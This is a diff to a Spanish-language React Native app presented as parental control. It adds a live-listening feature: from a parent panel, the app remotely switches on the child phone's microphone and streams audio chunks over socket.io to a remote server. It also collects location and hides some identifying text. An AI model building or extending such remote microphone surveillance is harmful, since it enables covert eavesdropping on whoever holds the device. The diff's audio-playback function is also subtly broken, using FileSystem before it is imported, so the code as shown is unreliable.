@@ -1,13 +1,14 @@
-import React, { useState, useEffect, useRef, useCallback } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import {
   View, Text, StyleSheet, TouchableOpacity, SafeAreaView,
-  Alert, ScrollView, TextInput, Platform, Linking, AppState,
-  NativeModules, DeviceEventEmitter
+  Alert, ScrollView, TextInput, Platform
 } from 'react-native';
 import * as Notifications from 'expo-notifications';
 import * as Device from 'expo-device';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import Constants from 'expo-constants';
+import { Audio } from 'expo-av';
+import { io } from 'socket.io-client';
 
 const SERVER_URL = 'https://control-parental-server-production.up.railway.app';
 
@@ -42,46 +43,102 @@ export default function App() {
   const [mode, setMode] = useState(null);
   const [isConnected, setIsConnected] = useState(false);
   const [history, setHistory] = useState([]);
-  const [childDevices, setChildDevices] = useState([]);
   const [pushToken, setPushToken] = useState(null);
-  const [childToken, setChildToken] = useState(null);
   const [childDeviceId, setChildDeviceId] = useState('child');
   const [childInfo, setChildInfo] = useState(null);
   const [secretCode, setSecretCode] = useState('');
   const [lastCommand, setLastCommand] = useState(null);
   const [commandResults, setCommandResults] = useState([]);
-  const [batteryLevel, setBatteryLevel] = useState(null);
-  const [lastLocation, setLastLocation] = useState(null);
+  const [isLiveListening, setIsLiveListening] = useState(false);
+  const [isLiveReceiving, setIsLiveReceiving] = useState(false);
+  const [liveChunksReceived, setLiveChunksReceived] = useState(0);
+  const socketRef = useRef(null);
+  const recordingRef = useRef(null);
+  const soundRef = useRef(null);
+  const chunkIndexRef = useRef(0);
+  const liveIntervalRef = useRef(null);
+  const isRecordingRef = useRef(false);
   const notificationListener = useRef();
   const responseListener = useRef();
-  const appState = useRef(AppState.currentState);
 
   useEffect(() => {
     loadSavedMode();
     setupNotifications();
     return () => {
-      if (notificationListener.current) {
-        Notifications.removeNotificationSubscription(notificationListener.current);
-      }
-      if (responseListener.current) {
-        Notifications.removeNotificationSubscription(responseListener.current);
-      }
+      if (notificationListener.current) Notifications.removeNotificationSubscription(notificationListener.current);
+      if (responseListener.current) Notifications.removeNotificationSubscription(responseListener.current);
+      cleanupSocket();
     };
   }, []);
 
   useEffect(() => {
     if (mode === 'hijo') {
       registerChildDevice();
+      connectSocket('child');
     } else if (mode === 'padre') {
       checkServer();
+      connectSocket('parent');
       const interval = setInterval(checkServer, 10000);
       return () => clearInterval(interval);
     }
+    return () => cleanupSocket();
   }, [mode]);
+
+  const cleanupSocket = () => {
+    if (socketRef.current) {
+      socketRef.current.disconnect();
+      socketRef.current = null;
+    }
+    stopLiveRecording();
+  };
+
+  const connectSocket = (role) => {
+    if (socketRef.current) socketRef.current.disconnect();
+
+    const socket = io(SERVER_URL, {
+      transports: ['websocket', 'polling'],
+      reconnection: true,
+      reconnectionAttempts: 10,
+      reconnectionDelay: 2000,
+    });
+
+    socket.on('connect', () => {
+      console.log('Socket connected:', socket.id);
+      socket.emit('register', { deviceId: childDeviceId, role });
+
+      if (role === 'parent') {
+        socket.emit('join-parent', { deviceId: childDeviceId });
+      }
+    });
+
+    socket.on('disconnect', () => {
+      console.log('Socket disconnected');
+    });
+
+    socket.on('command', (data) => {
+      if (data.command) {
+        executeChildCommand(data.command);
+      }
+    });
+
+    socket.on('live-audio', (data) => {
+      if (role === 'parent' && data.chunk) {
+        playAudioChunk(data.chunk, data.chunkIndex);
+      }
+    });
+
+    socket.on('connect_error', (err) => {
+      console.log('Socket error:', err.message);
+    });
+
+    socketRef.current = socket;
+  };
 
   const loadSavedMode = async () => {
     try {
       const savedMode = await AsyncStorage.getItem('appMode');
+      const savedDeviceId = await AsyncStorage.getItem('deviceId');
+      if (savedDeviceId) setChildDeviceId(savedDeviceId);
       if (savedMode) {
         setMode(savedMode);
         setScreen(savedMode);
@@ -95,30 +152,19 @@ export default function App() {
 
   const setupNotifications = () => {
     notificationListener.current = Notifications.addNotificationReceivedListener(notification => {
-      handleNotificationReceived(notification);
-    });
-
-    responseListener.current = Notifications.addNotificationResponseReceivedListener(response => {
-      handleNotificationResponse(response);
-    });
-  };
-
-  const handleNotificationReceived = (notification) => {
-    const data = notification.request.content.data;
-    if (data && data.command) {
-      if (mode === 'hijo') {
+      const data = notification.request.content.data;
+      if (data && data.command && mode === 'hijo') {
         executeChildCommand(data.command);
       }
-    }
-  };
-
-  const handleNotificationResponse = (response) => {
-    const data = response.notification.request.content.data;
-    if (data && data.action === 'open-parent') {
-      setMode('padre');
-      setScreen('padre');
-      AsyncStorage.setItem('appMode', 'padre');
-    }
+    });
+    responseListener.current = Notifications.addNotificationResponseReceivedListener(response => {
+      const data = response.notification.request.content.data;
+      if (data && data.action === 'open-parent') {
+        setMode('padre');
+        setScreen('padre');
+        AsyncStorage.setItem('appMode', 'padre');
+      }
+    });
   };
 
   const registerChildDevice = async () => {
@@ -126,24 +172,24 @@ export default function App() {
       const token = await registerForPushNotificationsAsync();
       if (token) {
         setPushToken(token);
-        const deviceId = 'child_' + (await AsyncStorage.getItem('deviceId') || Math.random().toString(36).substr(2, 9));
-        await AsyncStorage.setItem('deviceId', deviceId);
+        let deviceId = await AsyncStorage.getItem('deviceId');
+        if (!deviceId) {
+          deviceId = 'child_' + Math.random().toString(36).substr(2, 9);
+          await AsyncStorage.setItem('deviceId', deviceId);
+        }
         setChildDeviceId(deviceId);
 
         await fetch(`${SERVER_URL}/api/register-device`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            deviceId,
-            pushToken: token,
-            platform: Platform.OS,
+            deviceId, pushToken: token, platform: Platform.OS,
             manufacturer: Device.manufacturer || 'unknown',
             modelName: Device.modelName || 'unknown',
             osName: Device.osName || 'unknown',
             osVersion: Device.osVersion || 'unknown'
           })
         });
-
         setIsConnected(true);
       }
     } catch (e) {
@@ -156,12 +202,10 @@ export default function App() {
       const res = await fetch(`${SERVER_URL}/api/health`);
       const data = await res.json();
       setIsConnected(data.status === 'ok');
-
       const deviceRes = await fetch(`${SERVER_URL}/api/check-child`);
       const deviceData = await deviceRes.json();
       if (deviceData.connected) {
         setChildInfo(deviceData.device);
-        setChildToken(deviceData.device?.pushToken || null);
       }
     } catch (e) {
       setIsConnected(false);
@@ -170,32 +214,167 @@ export default function App() {
 
   const sendCommandToChild = async (commandType, params = {}) => {
     const command = { type: commandType, ...params, timestamp: Date.now() };
-
     try {
       const res = await fetch(`${SERVER_URL}/api/send-command`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ command, deviceId: childDeviceId || 'child' })
       });
-
       const data = await res.json();
       if (data.success) {
         setHistory(prev => [{ cmd: commandType, time: new Date().toLocaleTimeString(), status: 'sent' }, ...prev].slice(0, 20));
-        Alert.alert('Comando enviado', commandType);
+        if (commandType === 'listen-live') {
+          setIsLiveReceiving(true);
+          setLiveChunksReceived(0);
+          chunkIndexRef.current = 0;
+        } else if (commandType === 'stop-listen-live') {
+          setIsLiveReceiving(false);
+        } else {
+          Alert.alert('Comando enviado', commandType);
+        }
       } else {
         Alert.alert('Error', data.message || 'No se pudo enviar');
       }
     } catch (e) {
-      Alert.alert('Error', 'Sin conexión al servidor');
+      Alert.alert('Error', 'Sin conexion al servidor');
+    }
+  };
+
+  const startLiveRecording = async () => {
+    if (isRecordingRef.current) return;
+
+    try {
+      const { status } = await Audio.requestPermissionsAsync();
+      if (status !== 'granted') {
+        Alert.alert('Permiso requerido', 'Se necesita permiso de microfono');
+        return;
+      }
+
+      await Audio.setAudioModeAsync({ allowsRecordingIOS: true, playsInSilentModeIOS: true });
+
+      isRecordingRef.current = true;
+      setIsLiveListening(true);
+      chunkIndexRef.current = 0;
+
+      const recordChunk = async () => {
+        if (!isRecordingRef.current) return;
+
+        try {
+          const { recording } = await Audio.Recording.createAsync(
+            Audio.RecordingOptionsPresets.HIGH_QUALITY
+          );
+          recordingRef.current = recording;
+
+          await new Promise(resolve => setTimeout(resolve, 3000));
+
+          if (!isRecordingRef.current) {
+            try { await recording.stopAndUnloadAsync(); } catch(e) {}
+            return;
+          }
+
+          await recording.stopAndUnloadAsync();
+          const uri = recording.getURI();
+          recordingRef.current = null;
+
+          if (uri && socketRef.current) {
+            const { FileSystem } = await import('expo-file-system');
+            const base64 = await FileSystem.readAsStringAsync(uri, { encoding: FileSystem.EncodingType.Base64 });
+
+            if (socketRef.current && isRecordingRef.current) {
+              socketRef.current.emit('audio-chunk', {
+                deviceId: childDeviceId,
+                chunk: base64,
+                chunkIndex: chunkIndexRef.current++,
+                timestamp: Date.now()
+              });
+            }
+
+            try { await FileSystem.deleteAsync(uri, { idempotent: true }); } catch(e) {}
+          }
+
+          if (isRecordingRef.current) {
+            setTimeout(recordChunk, 100);
+          }
+        } catch (err) {
+          console.log('Chunk recording error:', err);
+          if (isRecordingRef.current) {
+            setTimeout(recordChunk, 500);
+          }
+        }
+      };
+
+      await recordChunk();
+    } catch (err) {
+      console.error('Error starting live recording:', err);
+      setIsLiveListening(false);
+      isRecordingRef.current = false;
+    }
+  };
+
+  const stopLiveRecording = () => {
+    isRecordingRef.current = false;
+    setIsLiveListening(false);
+    if (recordingRef.current) {
+      try {
+        recordingRef.current.stopAndUnloadAsync();
+      } catch (e) {}
+      recordingRef.current = null;
+    }
+  };
+
+  const playAudioChunk = async (base64Chunk, chunkIdx) => {
+    try {
+      if (soundRef.current) {
+        await soundRef.current.unloadAsync();
+        soundRef.current = null;
+      }
+
+      const filename = `chunk_${chunkIdx}.wav`;
+      const filePath = `${FileSystem.cacheDirectory}${filename}`;
+
+      const { FileSystem } = await import('expo-file-system');
+      await FileSystem.writeAsStringAsync(filePath, base64Chunk, { encoding: FileSystem.EncodingType.Base64 });
+
+      const { sound } = await Audio.Sound.createAsync(
+        { uri: filePath },
+        { shouldPlay: true }
+      );
+      soundRef.current = sound;
+      setLiveChunksReceived(prev => prev + 1);
+
+      sound.setOnPlaybackStatusUpdate((status) => {
+        if (status.didJustFinish) {
+          soundRef.current = null;
+        }
+      });
+    } catch (err) {
+      console.log('Error playing chunk:', err);
     }
   };
 
   const executeChildCommand = async (command) => {
     setLastCommand(command);
-
     const result = { command: command.type, timestamp: new Date().toLocaleTimeString(), status: 'executed' };
 
     switch (command.type) {
+      case 'listen-live':
+        await startLiveRecording();
+        result.status = 'live-recording-started';
+        break;
+
+      case 'stop-listen-live':
+        stopLiveRecording();
+        result.status = 'live-recording-stopped';
+        break;
+
+      case 'listen':
+        try {
+          await startLiveRecording();
+          setTimeout(() => stopLiveRecording(), 30000);
+          result.status = 'recording-30s';
+        } catch (e) { result.status = 'error: ' + e.message; }
+        break;
+
       case 'play-sound':
         try {
           await Notifications.scheduleNotificationAsync({
@@ -212,7 +391,6 @@ export default function App() {
           const { status } = await Location.requestForegroundPermissionsAsync();
           if (status === 'granted') {
             const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
-            setLastLocation(loc.coords);
             await fetch(`${SERVER_URL}/api/send-to-parent`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -232,7 +410,6 @@ export default function App() {
           const { Battery } = await import('expo-battery');
           const level = await Battery.getBatteryLevelAsync();
           const state = await Battery.getBatteryStateAsync();
-          setBatteryLevel(Math.round(level * 100));
           await fetch(`${SERVER_URL}/api/send-to-parent`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -246,45 +423,14 @@ export default function App() {
         } catch (e) { result.status = 'error'; }
         break;
 
-      case 'take-photo':
-      case 'start-camera':
-      case 'start-screen':
-      case 'switch-camera':
-      case 'stop-camera':
-      case 'stop-screen':
-      case 'screenshot':
-        result.status = 'needs-native-module';
-        await fetch(`${SERVER_URL}/api/send-to-parent`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            event: command.type + '-response',
-            data: { status: 'command-received', message: 'Función requiere build nativo personalizado' },
-            deviceId: childDeviceId
-          })
-        });
-        break;
-
       case 'send-notification':
         try {
           await Notifications.scheduleNotificationAsync({
-            content: {
-              title: 'Mensaje de Papá/Mamá',
-              body: command.message || 'Tienes un mensaje',
-              sound: true,
-            },
+            content: { title: 'Mensaje', body: command.message || 'Tienes un mensaje', sound: true },
             trigger: null,
           });
           result.status = 'success';
         } catch (e) { result.status = 'error'; }
-        break;
-
-      case 'lock-device':
-      case 'volume-up':
-      case 'volume-down':
-      case 'press-back':
-      case 'press-home':
-        result.status = 'needs-native-module';
         break;
 
       default:
@@ -297,11 +443,7 @@ export default function App() {
       await fetch(`${SERVER_URL}/api/send-to-parent`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          event: 'command-result',
-          data: result,
-          deviceId: childDeviceId
-        })
+        body: JSON.stringify({ event: 'command-result', data: result, deviceId: childDeviceId })
       });
     } catch (e) {}
   };
@@ -310,14 +452,6 @@ export default function App() {
     setMode(selectedMode);
     setScreen(selectedMode);
     AsyncStorage.setItem('appMode', selectedMode);
-  };
-
-  const openAndroidSettings = () => {
-    if (Platform.OS === 'android') {
-      Linking.openURL('package:com.parentalcontrol.app').catch(() => {
-        Linking.openURL('package:com.parentalcontrol.app');
-      });
-    }
   };
 
   const handleSecretAccess = async () => {
@@ -346,7 +480,7 @@ export default function App() {
         <View style={styles.center}>
           <TextInput
             style={styles.secretInput}
-            placeholder="Código secreto"
+            placeholder="Codigo secreto"
             placeholderTextColor="#999"
             keyboardType="numeric"
             secureTextEntry
@@ -354,10 +488,7 @@ export default function App() {
             onChangeText={setSecretCode}
             onEndEditing={handleSecretAccess}
           />
-          <Text style={styles.info}>Ingresa el código para acceder</Text>
-          <Text style={[styles.info, { fontSize: 12, color: '#999', marginTop: 10 }]}>
-            Default: 1234
-          </Text>
+          <Text style={styles.info}>Ingresa el codigo para acceder</Text>
         </View>
       </SafeAreaView>
     );
@@ -379,11 +510,8 @@ export default function App() {
             <Text style={styles.btnText}>Soy el Hijo</Text>
             <Text style={styles.btnSubtext}>Ser monitoreado</Text>
           </TouchableOpacity>
-          <TouchableOpacity
-            style={[styles.btn, { backgroundColor: '#333', marginTop: 10 }]}
-            onPress={() => setScreen('hidden')}
-          >
-            <Text style={[styles.btnText, { fontSize: 14 }]}>⚙ Configuración avanzada</Text>
+          <TouchableOpacity style={[styles.btn, { backgroundColor: '#333', marginTop: 10 }]} onPress={() => setScreen('hidden')}>
+            <Text style={[styles.btnText, { fontSize: 14 }]}>Configuracion avanzada</Text>
           </TouchableOpacity>
         </View>
       </SafeAreaView>
@@ -401,36 +529,25 @@ export default function App() {
           <View style={styles.statusCard}>
             <View style={[styles.dot, { backgroundColor: isConnected ? '#4caf50' : '#f44336' }]} />
             <Text style={styles.statusText}>
-              {isConnected ? 'Conectado - Servicios activos' : 'Verificando conexión...'}
+              {isLiveListening ? 'EN VIVO - Microfono activo...' :
+               isConnected ? 'Conectado - Servicios activos' : 'Verificando conexion...'}
             </Text>
           </View>
+
+          {isLiveListening && (
+            <View style={[styles.statusCard, { marginTop: 10, backgroundColor: '#ffebee', borderColor: '#f44336', borderWidth: 1 }]}>
+              <Text style={{ fontSize: 12, color: '#f44336', fontWeight: 'bold' }}>MICROFONO ACTIVO EN TIEMPO REAL</Text>
+            </View>
+          )}
 
           <Text style={[styles.info, { marginTop: 20, fontSize: 14, color: '#666' }]}>
             ID: {childDeviceId}
           </Text>
 
-          {pushToken && (
-            <Text style={[styles.info, { fontSize: 10, color: '#999', marginTop: 5 }]} numberOfLines={1}>
-              Token: {pushToken.substring(0, 30)}...
-            </Text>
-          )}
-
           {lastCommand && (
             <View style={[styles.statusCard, { marginTop: 15, backgroundColor: '#f0f0f0' }]}>
-              <Text style={{ fontSize: 12, color: '#333' }}>Último comando: {lastCommand.type}</Text>
+              <Text style={{ fontSize: 12, color: '#333' }}>Ultimo comando: {lastCommand.type}</Text>
               <Text style={{ fontSize: 10, color: '#999' }}>{new Date(lastCommand.timestamp).toLocaleTimeString()}</Text>
-            </View>
-          )}
-
-          {commandResults.length > 0 && (
-            <View style={{ marginTop: 15, width: '100%', paddingHorizontal: 20 }}>
-              <Text style={{ fontSize: 14, fontWeight: 'bold', color: '#333', marginBottom: 5 }}>Historial</Text>
-              {commandResults.slice(0, 5).map((r, i) => (
-                <View key={i} style={styles.histItem}>
-                  <Text style={{ fontSize: 12 }}>{r.command}</Text>
-                  <Text style={{ fontSize: 10, color: r.status === 'success' ? '#4caf50' : '#999' }}>{r.status}</Text>
-                </View>
-              ))}
             </View>
           )}
         </View>
@@ -444,7 +561,7 @@ export default function App() {
         <Text style={styles.title}>Panel de Control</Text>
         <View style={styles.status}>
           <View style={[styles.dot, { backgroundColor: isConnected ? '#4caf50' : '#f44336' }]} />
-          <Text style={styles.statusText}>{isConnected ? 'Servidor conectado' : 'Sin conexión'}</Text>
+          <Text style={styles.statusText}>{isConnected ? 'Servidor conectado' : 'Sin conexion'}</Text>
         </View>
         {childInfo && (
           <Text style={[styles.statusText, { marginTop: 5, fontSize: 12 }]}>
@@ -454,52 +571,51 @@ export default function App() {
       </View>
 
       <View style={styles.section}>
-        <Text style={styles.sectionTitle}>Cámara</Text>
+        <Text style={styles.sectionTitle}>Escuchar en Vivo</Text>
         <View style={styles.row}>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#4caf50' }]} onPress={() => sendCommandToChild('start-camera')}>
-            <Text style={styles.cmdText}>Iniciar</Text>
-          </TouchableOpacity>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#f44336' }]} onPress={() => sendCommandToChild('stop-camera')}>
-            <Text style={styles.cmdText}>Detener</Text>
-          </TouchableOpacity>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#ff9800' }]} onPress={() => sendCommandToChild('switch-camera')}>
-            <Text style={styles.cmdText}>Cambiar</Text>
+          <TouchableOpacity
+            style={[styles.cmdBtn, { backgroundColor: isLiveReceiving ? '#f44336' : '#e91e63', minHeight: 60 }]}
+            onPress={() => {
+              if (isLiveReceiving) {
+                sendCommandToChild('stop-listen-live');
+              } else {
+                sendCommandToChild('listen-live');
+              }
+            }}
+          >
+            <Text style={[styles.cmdText, { fontSize: 16 }]}>
+              {isLiveReceiving ? 'DETENER ESCUCHA' : 'ESCUCHAR EN VIVO'}
+            </Text>
+            {isLiveReceiving && (
+              <Text style={{ color: '#fff', fontSize: 11, marginTop: 4 }}>
+                Chunks recibidos: {liveChunksReceived}
+              </Text>
+            )}
           </TouchableOpacity>
         </View>
+        {isLiveReceiving && (
+          <View style={{ marginTop: 10, padding: 10, backgroundColor: '#ffebee', borderRadius: 8 }}>
+            <Text style={{ color: '#f44336', fontWeight: 'bold', textAlign: 'center' }}>
+              ESCUCHANDO EN TIEMPO REAL - {liveChunksReceived} fragmentos
+            </Text>
+          </View>
+        )}
       </View>
 
       <View style={styles.section}>
-        <Text style={styles.sectionTitle}>Pantalla</Text>
+        <Text style={styles.sectionTitle}>Otros Comandos</Text>
         <View style={styles.row}>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#1a73e8' }]} onPress={() => sendCommandToChild('start-screen')}>
-            <Text style={styles.cmdText}>Espejo ON</Text>
-          </TouchableOpacity>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#f44336' }]} onPress={() => sendCommandToChild('stop-screen')}>
-            <Text style={styles.cmdText}>Espejo OFF</Text>
-          </TouchableOpacity>
-        </View>
-      </View>
-
-      <View style={styles.section}>
-        <Text style={styles.sectionTitle}>Acciones</Text>
-        <View style={styles.row}>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#9c27b0' }]} onPress={() => sendCommandToChild('play-sound')}>
+          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#4caf50' }]} onPress={() => sendCommandToChild('play-sound')}>
             <Text style={styles.cmdText}>Sonido</Text>
           </TouchableOpacity>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#f44336' }]} onPress={() => sendCommandToChild('lock-device')}>
-            <Text style={styles.cmdText}>Bloquear</Text>
-          </TouchableOpacity>
           <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#1a73e8' }]} onPress={() => sendCommandToChild('get-location')}>
-            <Text style={styles.cmdText}>Ubicación</Text>
+            <Text style={styles.cmdText}>Ubicacion</Text>
+          </TouchableOpacity>
+          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#ff5722' }]} onPress={() => sendCommandToChild('get-battery')}>
+            <Text style={styles.cmdText}>Bateria</Text>
           </TouchableOpacity>
         </View>
         <View style={[styles.row, { marginTop: 10 }]}>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#ff5722' }]} onPress={() => sendCommandToChild('get-battery')}>
-            <Text style={styles.cmdText}>Batería</Text>
-          </TouchableOpacity>
-          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#009688' }]} onPress={() => sendCommandToChild('screenshot')}>
-            <Text style={styles.cmdText}>Pantalla</Text>
-          </TouchableOpacity>
           <TouchableOpacity
             style={[styles.cmdBtn, { backgroundColor: '#607d8b' }]}
             onPress={() => {
@@ -515,7 +631,7 @@ export default function App() {
 
       {history.length > 0 && (
         <View style={styles.section}>
-          <Text style={styles.sectionTitle}>Historial de Comandos</Text>
+          <Text style={styles.sectionTitle}>Historial</Text>
           {history.map((h, i) => (
             <View key={i} style={styles.histItem}>
               <Text style={{ fontSize: 13 }}>{h.cmd}</Text>
@@ -526,15 +642,13 @@ export default function App() {
       )}
 
       <View style={{ padding: 20, gap: 10 }}>
-        <TouchableOpacity style={[styles.btn, { backgroundColor: '#333' }]} onPress={() => checkServer()}>
-          <Text style={[styles.btnText, { fontSize: 14 }]}>Actualizar estado</Text>
-        </TouchableOpacity>
         <TouchableOpacity style={[styles.btn, { backgroundColor: '#f44336' }]} onPress={() => {
           setMode(null);
           setScreen('menu');
           AsyncStorage.removeItem('appMode');
+          cleanupSocket();
         }}>
-          <Text style={[styles.btnText, { fontSize: 14 }]}>Cerrar sesión</Text>
+          <Text style={[styles.btnText, { fontSize: 14 }]}>Cerrar sesion</Text>
         </TouchableOpacity>
       </View>
     </ScrollView>
@@ -551,7 +665,6 @@ const styles = StyleSheet.create({
   btnText: { color: '#fff', fontSize: 20, fontWeight: 'bold' },
   btnSubtext: { color: 'rgba(255,255,255,0.7)', fontSize: 12, marginTop: 5 },
   center: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 30 },
-  bigIcon: { fontSize: 80 },
   info: { fontSize: 16, color: '#333', textAlign: 'center' },
   status: { flexDirection: 'row', alignItems: 'center', marginTop: 10 },
   dot: { width: 12, height: 12, borderRadius: 6, marginRight: 8 },
@@ -563,11 +676,11 @@ const styles = StyleSheet.create({
   section: { backgroundColor: '#fff', margin: 15, padding: 15, borderRadius: 10 },
   sectionTitle: { fontSize: 18, fontWeight: 'bold', color: '#333', marginBottom: 10 },
   row: { flexDirection: 'row', justifyContent: 'space-between' },
-  cmdBtn: { flex: 1, padding: 15, borderRadius: 10, marginHorizontal: 5, alignItems: 'center' },
+  cmdBtn: { flex: 1, padding: 15, borderRadius: 10, marginHorizontal: 5, alignItems: 'center', justifyContent: 'center' },
   cmdText: { color: '#fff', fontWeight: 'bold', fontSize: 14 },
   histItem: {
-    flexDirection: 'row', justifyContent: 'space-between', paddingVertical: 8,
-    borderBottomWidth: 1, borderBottomColor: '#eee',
+    flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center',
+    paddingVertical: 8, borderBottomWidth: 1, borderBottomColor: '#eee',
   },
   histTime: { color: '#999', fontSize: 12 },
   secretInput: {
